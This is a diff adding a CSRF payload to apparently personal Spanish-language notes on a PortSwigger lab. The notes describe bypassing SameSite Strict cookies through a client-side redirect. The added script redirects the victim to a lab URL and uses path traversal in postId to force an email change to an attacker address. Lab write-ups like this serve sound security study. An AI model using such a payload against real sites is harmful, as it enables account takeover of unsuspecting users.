@@ -87,3 +87,13 @@ asegúrate de cambiar el correo electrónico en este punto y cuando la web haga 
 efectivamente esto ha funcionado y hemos cambiado el correo electrónico haciendo un ataque CSRF haciendo omisión estricta de SameSite mediante redirección del lado del cliente
 ![[Pasted image 20250711180737.png]]
 
+
+```python
+#Inyeción 5
+
+<script>
+    document.location = "https://0a6500d704747bd48259f62700fb0078.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=HACKERPRO%40poetswiggers.com%26submit=1";
+</script>
+
+```
+
